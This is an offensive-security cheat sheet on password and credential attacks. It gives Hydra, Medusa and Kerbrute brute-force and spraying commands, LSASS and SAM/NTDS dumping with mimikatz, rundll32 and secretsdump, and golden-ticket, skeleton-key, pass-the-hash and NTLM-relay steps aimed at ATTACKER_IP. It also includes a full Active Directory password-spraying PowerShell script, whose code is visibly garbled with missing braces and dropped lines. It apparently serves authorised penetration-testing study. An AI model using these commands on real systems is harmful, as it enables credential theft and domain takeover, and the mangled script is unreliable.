./username-anarchy -i /path/to/listoffirstandlastnames.txt
```

### Remote Password Attacks

```
# Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.
hydra -L user.list -P password.list <service>://<ip>

# Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.
hydra -C <user_pass.list> ssh://<IP>

# Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam

# Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa

# Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.
crackmapexec smb <ip> -u <username> -p <password> --ntds
```

### Windows Credential Harvesting

```
# Uses Windows command-line based utility findstr to search for the string "password" in many different file type.
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# A PowerShell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.
Get-Process lsass

# Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.
pypykatz lsa minidump /path/to/lsassdumpfile

# Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).
reg.exe save hklm\sam C:\sam.save

# Uses move in Windows to transfer a file to a specified file share over the network.
move sam.save \\<ip>\NameofFileShare

# Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

```cmd
laZagne.exe all
```

#### Common Commands

```cmd
token::elevate
token::revert
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
```

#### Dump Hashes

```cmd
.\mimikatz.exe
sekurlsa::minidump /users/admin/Desktop/lsass.DMP
sekurlsa::LogonPasswords
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create
```

#### Pass the Ticket

```cmd
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
dir \\<RHOST>\admin$
```

#### Forging Golden Ticket

```cmd
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /<USERNAME>:<PASSWORD> /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:<NTLM_HASH> /id:500
misc::cmd
```

#### Skeleton Key

```cmd
misc::skeleton
net use C:\\<RHOST>\admin$ /<USERNAME>:<PASSWORD> mimikatz
dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

```shell
pypykatz lsa minidump lsass.dmp
pypykatz registry --sam sam system
```

### Linux Credential Hunting

```
# Script that can be used to find .conf, .config and .cnf files on a Linux system.
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -Ev "lib|fonts|share|core" ;done

# Script that can be used to find credentials in specified file types.
for i in $(find / -name *.cnf 2>/dev/null | grep -Ev "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done

# Script that can be used to find common database files.
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -Ev "doc|lib|headers|share|man";done

# Uses Linux-based find command to search for text files.
find /home/* -type f \( -name "*.txt" -o ! -name "*.*" \)

# Uses Linux-based command grep to search the file system for key terms PRIVATE KEY to discover SSH keys.
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

### Cracking Passwords

```
# Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.
hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt --show

# Runs John in conjunction with a wordlist to crack a pdf hash.
john --wordlist=rockyou.txt pdf.hash

# Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
office2john.py Protected.docx > protected-docx.hash
```

```shell
fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
```

### Login Brute Forcing (Hydra)

```
# Basic Auth Brute Force - User/Pass Wordlists
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /

# Login Form Brute Force - Static User, Pass Wordlist
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

```shell
hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
```

```shell
export HYDRA_PROXY=connect://127.0.0.1:8080
unset HYDRA_PROXY
```

```shell
hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-get://<RHOST>
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
hydra <RHOST> -L /PATH/TO/WORDLIST/<WORDLIST> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
```

### Hashing, John & Hashcat

Identify hashes before cracking:

```bash
hashid -j <HASH>
hashid -m '$1$...'
```

John:

```bash
john --single passwd
john --wordlist=<WORDLIST> <HASH_FILE>
john --incremental <HASH_FILE>
john <HASH_FILE> --show
```

Hashcat:

```bash
hashcat -a 0 -m 0 <HASH> /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 0 <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -a 3 -m 0 <HASH> '?u?l?l?l?l?d?s'
hashcat --help
```

Protected files and archives:

```bash
locate '*2john*'

ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash

office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash

pdf2john.py PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash

zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash

bitlocker2john -i Backup.vhd > backup.hashes
```

Use `hashcat --example-hashes` or `hashid` to map the format to the correct mode.

> https://hashcat.net/hashcat/

> https://hashcat.net/wiki/doku.php?id=hashcat

> https://hashcat.net/cap2hashcat/

> https://hashcat.net/wiki/doku.php?id=example_hashes

```shell
hashcat -m 0 md5 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 100 sha-1 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 1400 sha256 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 3200 bcrypt /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 900 md4 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 1000 ntlm /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 1800 sha512 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 160 hmac-sha1 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
```

```shell
hashcat --example-hashes
hashcat --help | grep -i "ntlm"
```

```shell
hashcat --identify --user <FILE>
```

```shell
/usr/share/wordlists/fasttrack.txt
/usr/share/hashcat/rules/best64.rule
```

#### Custom Rules

> https://hashcat.net/wiki/doku.php?id=rule_based_attack

#### Add a 1 to each Password

```shell
echo \$1 > <FILE>.rule
```

#### Capitalize first character

```shell
$1
c
```

#### Add nothing, a 1 or a ! to an existing Wordlist

```shell
:
$!
```

#### Rule for upper case Letter, numerical Value and special Character

- $1 > appends a "1"
- $2 > appends a "2"
- $3 > appends a "3"
- c > Capitalize the first character and lower case the rest

```shell
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

#### Rule Preview

```shell
hashcat -r <FILE>.rule --stdout <FILE>.txt
```

#### Cracking ASPREPRoast Password File

```shell
hashcat -m 18200 -a 0 <FILE> <FILE>
```

#### Cracking Kerberoasting Password File

```shell
hashcat -m 13100 --force <FILE> <FILE>
```

#### Bruteforce based on the Pattern

```shell
hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
```

#### Generate Password Candidates: Wordlist + Pattern

```shell
hashcat -a6 -m0 "<NTLM_HASH>" yourPassword|/PATH/TO/WORDLIST/<WORDLIST> ?d?d?d?u?u?u --force --potfile-disable --stdout
```

#### Generate NetNLTMv2 with internalMonologue and crack with hashcat

```shell
InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
```

#### Result

```shell
spotless::WS01:1122334455667788:<NTLM_HASH>:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
```

#### Crack with hashcat

```shell
hashcat -m5600 'spotless::WS01:1122334455667788:<NTLM_HASH>:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /PATH/TO/WORDLIST/<WORDLIST> --force --potfile-disable
```

#### Rules

> https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule

#### Cracking with OneRuleToRuleThemAll.rule

```shell
hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
```

```shell
keepass2john <FILE>
ssh2john id_rsa > <FILE>
zip2john <FILE> > <FILE>
john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=crypt
john <FILE> --rules --wordlist=/PATH/TO/WORDLIST/<WORDLIST
john --show <FILE>
```

### Credential Access & Lateral Movement

Windows credential sources:

```cmd
# SAM / SYSTEM / SECURITY
reg save HKLM\SAM SAM.SAV
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SECURITY SECURITY.SAV

# LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Credential Manager
cmdkey /list
runas /savecred /user:<DOMAIN>\<USER> cmd

# NTDS.dit (on a DC or from a backup)
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q
```

```bash
secretsdump.py -sam SAM.SAV -system SYSTEM.SAV -security SECURITY.SAV LOCAL
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

Network credential hunting:

```bash
# Capture traffic and parse cleartext credentials
sudo tcpdump -i <IFACE> -s 65535 -w capture.pcap
./Pcredz -f capture.pcap -t -v

# SMB share hunting
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --content --pattern "passw"
```

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public
```

Pass-the-Hash (PtH):

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /run:cmd.exe" exit
```

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "whoami" -Verbose
Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "whoami"
```

```bash
impacket-psexec <USER>@<TARGET> -hashes :<NTLM_HASH>
evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>
xfreerdp /v:<TARGET> /u:<USER> /pth:<NTLM_HASH>
```

Pass-the-Ticket (PtT):

```text
# Windows — Rubeus
Rubeus.exe triage
Rubeus.exe dump /luid:<LUID> /service:krbtgt
Rubeus.exe ptt /ticket:<BASE64_TICKET>
klist
```

```bash
# Linux — keytab / ccache
klist -k -t <USER>.keytab
kinit <USER>@<DOMAIN> -k -t <USER>.keytab
klist
export KRB5CCNAME=/path/to/krb5cc_<UID>
smbclient //<DC>/<SHARE> -k -c ls
impacket-ticketConverter krb5cc_<UID> <USER>.kirbi
```

Pass-the-Certificate:

```bash
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs -smb2support \
  --template KerberosAuthentication
python3 printerbug.py <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET> <ATTACKER_IP>

git clone https://github.com/dirkjanm/PKINITtools.git
python3 gettgtpkinit.py -cert-pfx <CERT>.pfx -dc-ip <DC_IP> '<DOMAIN>/<USER>' /tmp/<USER>.ccache
export KRB5CCNAME=/tmp/<USER>.ccache
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator \
  '<DOMAIN>/<USER>'@<DC_FQDN>
```

Certificate services are high-impact: request a certificate for a privileged account, use PKINIT to get a TGT, then DCSync.

### Medusa & Custom Wordlists

Medusa:

```bash
medusa -h <TARGET> -U usernames.txt -P passwords.txt -M ssh
medusa -h <TARGET> -U usernames.txt -P passwords.txt -M ftp -t 5
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
medusa -h <TARGET> -U usernames.txt -e ns -M <SERVICE>
```

Custom wordlists:

```bash
# Username variants from a name
./username-anarchy Jane Smith > jane_usernames.txt

# Interactive custom password list
cupp -i

# Website keywords
cewl https://<TARGET> -d 4 -m 6 --lowercase -w site.wordlist

# Rules / mutations
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Filter generated passwords to match the policy, and respect lockout thresholds. Prefer spraying one password across many users over brute-forcing one account.

### Attack Types, Policy & Defense

- **Brute force** — try every value in a keyspace (short PINs, small OTP spaces).
- **Dictionary** — try a wordlist of likely passwords.
- **Hybrid** — wordlist plus mutations/rules (case, numbers, symbols).
- **Password spraying** — one or a few passwords across many users; avoids lockout.
- **Credential stuffing** — reuse credentials from breaches; watch for MFA and lockouts.

Before attacking, enumerate the policy and lockout threshold:

```bash
crackmapexec smb <DC> -u <USER> -p '<PASSWORD>' --pass-pol
rpcclient -U "" -N <DC> -c "querydominfo"
ldapsearch -h <DC> -x -b "DC=<DOMAIN>,DC=<TLD>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Check for MFA, CAPTCHA, rate limits, and account lockout. Prefer spraying with a single candidate and a delay. Defensively, enforce MFA, strong password policy, lockout thresholds, breached-password checks, and monitoring for distributed spraying. Password managers reduce reuse; never store cleartext credentials in world-readable files.

### Group Policy Preferences (GPP)

#### gpp-decrypt

```shell
python3 gpp-decrypt.py -f Groups.xml
python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

### Kerbrute

#### User Enumeration

```shell
./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
```

#### Password Spray

```shell
./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
```

### Spray-Passwords

#### Spray-Passwords.ps1

```powershell
<#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.

    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.

    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."

  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.

  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.

  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)". Default = $false.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'
    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,<PASSWORD>' -Admins
    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
    PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose

    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
    PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose

    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues & possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than "NET ACCOUNTS". Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID's or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.

#>
[CmdletBinding(DefaultParameterSetName='ByPass')]
Param
(
    [Parameter(Mandatory = $true, ParameterSetName = 'ByURL',HelpMessage="Download file from given URL and use as password input file to test multiple passwords for each targeted user account.")]
    [String]
    $Url = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByFile',HelpMessage="Supply a path to a password input file to test multiple passwords for each targeted user account.")]
    $File = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByPass',HelpMessage="Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'")]
    [AllowEmptyString()]
    $Pass = '',

    [Parameter(Mandatory = $false,HelpMessage="Warning: will also target privileged user accounts (admincount=1.)")]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into account
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(":")[1].Trim()

    If (isNumeric($threshold) )
            Write-Verbose "threshold is a number = $threshold"
            $threshold = [Int]$threshold
    Else
            Write-Verbose "Threshold is probably 'Never', setting max to 1000..."
            $threshold = [Int]1000

    Return $threshold

# Method to get the lockout observation window - does not take FGPP into account
Function Get-Duration
    $duration = [Int]$data[7].Split(":")[1].Trim()
    Write-Verbose "Lockout duration is = $duration"
    Return $duration

# Method to retrieve the user objects from the PDC
Function Get-UserObjects
    # Get domain info for current domain
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose "No domain found, will quit..." ; Exit}

    # Get the DC with the PDC emulator role
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Build the search string from which the users should be found
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName

    # Create a DirectorySearcher to poll the DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add("samaccountname") > $Null
    $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
    If ($Admins) {$Searcher.filter="(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    Else {$Searcher.filter="(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    $Searcher.PageSize = 1000

    # Find & return targeted user accounts
    $userObjs = $Searcher.FindAll()
    Return $userObjs

# Method to perform auth test with specific username and password
Function Perform-Authenticate
    ([String]$username,[String]$password)

    # Get current domain with ADSI
    $CurrentDomain = "LDAP://"+([ADSI]"").DistinguishedName

    # Try to authenticate
    Write-Verbose "Trying to authenticate as user '$username' with password '$password'"
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name

    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}

# Validate and parse user supplied url to CSV file of passwords
Function Parse-Url
    Param ([String]$url)

    # Download password file from URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq "") {Return $null}
    $passwords = $data.Split(",").Trim()
    Return $passwords

# Validate and parse user supplied CSV file of passwords
Function Parse-File
   Param ([String]$file)

   If (Test-Path $file)
        $data = Get-Content $file

   Else {Return $null}

# Main function to perform the actual brute force attack
Function BruteForce
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
   Write-Verbose "Found $(($userObj).count) active & unlocked users..."

   If ($passwords.Length -gt $threshold)
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host "Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes."

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
        $done += $false
        $usersCracked += $false
        $numTry += 0

   # Main while loop which does the actual brute force.
   Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)

            # Allow for manual stop of the while loop, while retaining the gathered results
            If ($Host.UI.RawUI.KeyAvailable -and ("q" -eq $Host.UI.RawUI.ReadKey("IncludeKeyUp,NoEcho").Character))
                Write-Host "Stopping bruteforce now...." -Background DarkRed
                Break Main

            If ($usersCracked[$i] -eq $false)
                If ($done[$i] -eq $false)
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]

                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                        # Try the auth with current password
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                            Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true

                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}

                        $now = Get-Date

                        If ($badpwdtime)
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes

                            If ($timediff -gt $duration)

                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}

                            } # Time-diff if

                            # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                            Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"

                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Check if the bruteforce is done so the while loop can be terminated
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
            If ($done[$j] -eq $true) {$amount += 1}

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
       Write-Host "Users guessed are:"
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host " '$($results[$i])' with password: '$($results[$i + 1])'"}
   Else {Write-Host "No passwords were guessed."}

$passwords = $null

If ($Url -ne '')
    $passwords = Parse-Url $Url
ElseIf($File -ne '')
    $passwords = Parse-File $File
    $passwords = $Pass.Split(",").Trim()

If($passwords -eq $null)
    Write-Host "Error in password input, please try again."
    Exit

# Get password policy info
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundColor DarkRed}

# Call the main function and start the brute force
BruteForce $duration $threshold $passwords
```

#### Usage

```cmd
.\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
```

### Wordlist Resources

| bopscrk | https://github.com/R3nt0n/bopscrk |
| CeWL | https://github.com/digininja/cewl |
| COOK | https://github.com/giteshnxtlvl/cook |
| CUPP | https://github.com/Mebus/cupp |
| Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
| SecLists | https://github.com/danielmiessler/SecLists |
| Username Anarchy | https://github.com/urbanadventurer/username-anarchy |

### Password Brute Force

Offline local resources

```
cewl
hash-identifier
pdfcrack SomeFile.pdf -w ~kali/rockyou.txt (For PDF files with passwords)
fcrackzip -u -D -p ~kali/rockyou.txt SomeZip.backup (Cracking zip files passwords)
rar2john MSSQL_BAK.rar --> john -wordlist=/home/kali/rockyou.txt MSQL.hashes (Cracking rar files)
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
john --wordlist=/home/kali/rockyou.txt sammy_hash.txt # Crack user hash [user:hash] in file
medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
hydra -l root -P password-file.txt 10.11.1.111 ssh
hydra -P password-file.txt -v 10.11.1.111 snmp
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 ftp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 pop3 -V
hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V

# SIMPLE LOGIN GET
hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V

# GET FORM with HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.111 -s 443 -S https-get-form "/index.php:login=^USER^&password=^PASS^:Incorrect login/password\!"

# SIMPLE LOGIN POST
hydra -l root@localhost -P <PASSWORD> 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I

# API REST LOGIN POST
hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64

# Dictionary creation
https://github.com/LandGrey/pydictor
https://github.com/Mebus/cupp
git clone https://github.com/sc0tfree/mentalist.git
```

Hashcat
```
https://hashcat.net/wiki/doku.php?id=example_hashes // m parameter
https://mattw.io/hashID/types // hashid match

hashcat -m 0 'hash$' /home/kali/rockyou.txt // MD5 raw
hashcat -m 1800 'hash$' /home/kali/rockyou.txt // sha512crypt
hashcat -m 1600 'hash$' /home/kali/rockyou.txt // MD5(APR)
hashcat -m 1500 'hash$' /home/kali/rockyou.txt // DES(Unix), Traditional DES, DEScrypt
hascat  -m 1000 'hash$' /home/kali/rockyou.txt // NTLM
